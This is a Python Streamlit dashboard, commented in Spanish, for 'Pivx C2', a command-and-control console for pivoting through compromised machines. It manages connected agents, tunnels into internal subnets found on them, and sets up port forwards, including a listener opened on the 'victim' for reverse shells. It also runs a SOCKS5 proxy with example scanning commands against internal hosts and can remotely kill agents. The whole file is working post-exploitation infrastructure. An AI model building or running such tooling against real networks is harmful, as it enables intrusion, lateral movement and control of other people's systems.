"""Pivx C2 - Dashboard (Streamlit) - Fase 2.

Ademas del estado de agentes (Fase 1), permite:
  - Iniciar/detener el tunel de datos (interfaz TUN pivx0) hacia un agente.
  - Anadir/quitar rutas hacia subredes internas (manual o sugeridas por el agente).

Requiere privilegios para crear la TUN y tocar la tabla de rutas:
    sudo -E streamlit run app.py
(-E conserva el entorno del venv). Pensado para Linux/WSL2.
"""

from __future__ import annotations

import ipaddress

import streamlit as st
from streamlit_autorefresh import st_autorefresh

from pivx_server import db, forward, runtime, ws_server

st.set_page_config(page_title="Pivx C2", page_icon="🕸️", layout="wide")


@st.cache_resource
def _boot_listener() -> str:
    started = ws_server.start_background_listener(
        host=ws_server.DEFAULT_HOST, port=ws_server.DEFAULT_PORT
    )
    return "arrancado" if started else "ya estaba activo"


def _suggested_subnets(agent_id: str) -> list[str]:
    """Convierte las CIDRs de interfaz del agente en subredes de red sugeridas."""
    subnets: set[str] = set()
    for iface in db.get_agent_interfaces(agent_id):
        for cidr in iface.get("cidrs", []):
            try:
                net = ipaddress.ip_interface(cidr).network
                subnets.add(str(net))
            except ValueError:
                continue
    return sorted(subnets)


boot_status = _boot_listener()
st_autorefresh(interval=3000, key="pivx_refresh")

# --- Cabecera -------------------------------------------------------------
st.title("🕸️ Pivx — Consola C2")
if db.is_read_only():
    st.warning("📖 Modo Solo Lectura — la BD está bloqueada por el Auto-Pilot CLI")
st.caption(
    f"Listener WebSocket en `ws://{ws_server.DEFAULT_HOST}:{ws_server.DEFAULT_PORT}` "
    f"· estado: **{boot_status}**"
)

agents_df = db.get_agents_df()
tun_status = runtime.status()
online_ids = tun_status["online_sessions"]

# --- Metricas -------------------------------------------------------------
online = len(online_ids)
total = 0 if agents_df.empty else len(agents_df)
active = tun_status["active_agent_id"]

c1, c2, c3, c4 = st.columns(4)
c1.metric("Agentes online", online)
c2.metric("Agentes totales", total)
c3.metric("Túnel activo", "sí" if active else "no")
c4.metric("Rutas activas", len(tun_status["routes"]))

# --- Panel de túnel -------------------------------------------------------
st.subheader("🔌 Túnel de datos")

if active:
    st.success(f"Túnel **{tun_status['tun_name']}** activo hacia el agente `{active}`.")
    if st.button("Detener túnel", type="primary"):
        try:
            runtime.deactivate_tunnel()
            st.rerun()
        except Exception as e:  # noqa: BLE001
            st.error(f"No se pudo detener el túnel: {e}")
else:
    if not online_ids:
        st.info("Conecta un agente para poder iniciar un túnel.")
    else:
        col_sel, col_btn = st.columns([3, 1])
        chosen = col_sel.selectbox("Agente destino", online_ids, key="tun_agent")
        if col_btn.button("Iniciar túnel"):
            try:
                runtime.activate_tunnel(chosen)
                st.rerun()
            except Exception as e:  # noqa: BLE001
                st.error(
                    f"No se pudo iniciar el túnel: {e}\n\n"
                    "¿Estás ejecutando con privilegios (sudo) en Linux/WSL2?"
                )

# --- Rutas (solo con túnel activo) ----------------------------------------
if active:
    st.subheader("🧭 Rutas")

    suggested = _suggested_subnets(active)
    if suggested:
        st.caption("Subredes descubiertas en el agente (clic para enrutar):")
        cols = st.columns(min(len(suggested), 4))
        for i, subnet in enumerate(suggested):
            already = subnet in tun_status["routes"]
            label = f"✓ {subnet}" if already else f"➕ {subnet}"
            if cols[i % len(cols)].button(label, key=f"sug_{subnet}", disabled=already):
                try:
                    runtime.add_route(subnet)
                    st.rerun()
                except Exception as e:  # noqa: BLE001
                    st.error(f"Error añadiendo ruta: {e}")

    with st.form("add_route_form", clear_on_submit=True):
        col_in, col_add = st.columns([3, 1])
        manual = col_in.text_input("Ruta manual (CIDR)", placeholder="10.10.20.0/24")
        submitted = col_add.form_submit_button("Añadir ruta")
        if submitted and manual:
            try:
                ipaddress.ip_network(manual, strict=False)  # validacion
                runtime.add_route(manual)
                st.rerun()
            except ValueError:
                st.error("CIDR inválido.")
            except Exception as e:  # noqa: BLE001
                st.error(f"Error añadiendo ruta: {e}")

    routes = tun_status["routes"]
    if routes:
        st.caption("Rutas activas:")
        for cidr in routes:
            c_a, c_b = st.columns([4, 1])
            c_a.code(f"{cidr}  →  {tun_status['tun_name']}", language=None)
            if c_b.button("Quitar", key=f"del_{cidr}"):
                try:
                    runtime.del_route(cidr)
                    st.rerun()
                except Exception as e:  # noqa: BLE001
                    st.error(f"Error quitando ruta: {e}")
    else:
        st.write("Sin rutas todavía.")

# --- Port forwarding (L4) -------------------------------------------------
# Independiente del tunel L3: funciona en cuanto hay un agente conectado.
st.subheader("🔀 Port forwarding (L4)")
fstatus = forward.status()

if not fstatus["agent_id"]:
    st.info("Conecta un agente para usar port-forwarding.")
else:
    st.caption(
        f"Agente destino: `{fstatus['agent_id']}` · "
        f"streams activos: **{fstatus['active_streams']}**"
    )
    tab_local, tab_remote = st.tabs(["Local (-L)", "Remote (-R)"])

    # Local: el servidor escucha y el agente marca hacia la red interna.
    with tab_local:
        st.caption("Escucha en tu máquina y tuneliza hacia un `IP:puerto` interno.")
        with st.form("local_fwd_form", clear_on_submit=True):
            c1, c2, c3, c4 = st.columns([2, 1, 2, 1])
            l_host = c1.text_input("Bind local", value="127.0.0.1")
            l_port = c2.number_input("Puerto", 1, 65535, value=8080, step=1)
            l_dst = c3.text_input("Destino (agente)", placeholder="10.10.20.5:80")
            if c4.form_submit_button("Crear") and l_dst:
                try:
                    forward.start_local_forward_sync(l_host, int(l_port), l_dst)
                    st.rerun()
                except Exception as e:  # noqa: BLE001
                    st.error(f"No se pudo crear el forward: {e}")
        for f in fstatus["local_forwards"]:
            ca, cb = st.columns([4, 1])
            ca.code(f"{f['bind']}  →  (agente)  {f['dst']}", language=None)
            if cb.button("Quitar", key=f"dl_{f['id']}"):
                forward.stop_local_forward_sync(f["id"])
                st.rerun()

    # Remote: el agente escucha en la víctima y reenvía hacia un destino local.
    with tab_remote:
        st.caption("El agente abre un puerto en la víctima (ideal reverse shells).")
        with st.form("remote_fwd_form", clear_on_submit=True):
            c1, c2, c3 = st.columns([2, 2, 1])
            r_bind = c1.text_input("Bind víctima", value="0.0.0.0:4444")
            r_dst = c2.text_input("Destino local", value="127.0.0.1:5555")
            if c3.form_submit_button("Crear") and r_bind and r_dst:
                try:
                    forward.start_remote_forward_sync(r_bind, r_dst)
                    st.rerun()
                except Exception as e:  # noqa: BLE001
                    st.error(f"No se pudo crear el forward: {e}")
        for f in fstatus["remote_forwards"]:
            ca, cb = st.columns([4, 1])
            ca.code(f"(víctima) {f['bind']}  →  {f['dst']}", language=None)
            if cb.button("Quitar", key=f"dr_{f['id']}"):
                forward.stop_remote_forward_sync(f["id"])
                st.rerun()

    # --- SOCKS5 dinámico (L7) ---------------------------------------------
    st.markdown("**🧦 Proxy SOCKS5**")
    if fstatus["socks_running"]:
        st.success(
            f"SOCKS5 activo en `socks5://{fstatus['socks_bind']}` → agente "
            f"`{fstatus['agent_id']}`."
        )
        st.caption(
            "Úsalo con tus herramientas, p. ej.:  "
            "`proxychains -q curl http://10.10.20.5/`  ·  "
            "`ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.5/FUZZ`"
        )
        if st.button("Detener SOCKS5"):
            forward.stop_socks_sync()
            st.rerun()
    else:
        cs1, cs2, cs3 = st.columns([2, 1, 1])
        s_host = cs1.text_input("Bind", value=forward.DEFAULT_SOCKS_HOST, key="socks_host")
        s_port = cs2.number_input(
            "Puerto", 1, 65535, value=forward.DEFAULT_SOCKS_PORT, step=1, key="socks_port"
        )
        if cs3.button("Iniciar SOCKS5"):
            try:
                forward.start_socks_sync(s_host, int(s_port))
                st.rerun()
            except Exception as e:  # noqa: BLE001
                st.error(f"No se pudo iniciar SOCKS5: {e}")

# --- Tabla de agentes -----------------------------------------------------
st.subheader("🖥️ Agentes")
if agents_df.empty:
    st.info("Aún no se ha conectado ningún agente. Lanza el binario del agente Go.")
else:
    st.dataframe(agents_df, use_container_width=True, hide_index=True)

    if online_ids:
        st.caption("Kill remoto (el agente ejecuta os.Exit):")
        kill_cols = st.columns(min(len(online_ids), 4))
        for i, aid in enumerate(online_ids):
            short = aid[:8]
            if kill_cols[i % len(kill_cols)].button(
                f"💀 Kill {short}…", key=f"kill_{aid}", type="primary"
            ):
                try:
                    runtime.kill_agent(aid)
                    st.success(f"Kill enviado a `{short}…`")
                    st.rerun()
                except Exception as e:  # noqa: BLE001
                    st.error(f"Error: {e}")

# --- Log de eventos -------------------------------------------------------
st.subheader("📜 Log de conexiones")
logs_df = db.get_logs_df(limit=200)
if logs_df.empty:
    st.write("Sin eventos todavía.")
else:
    st.dataframe(logs_df, use_container_width=True, hide_index=True)
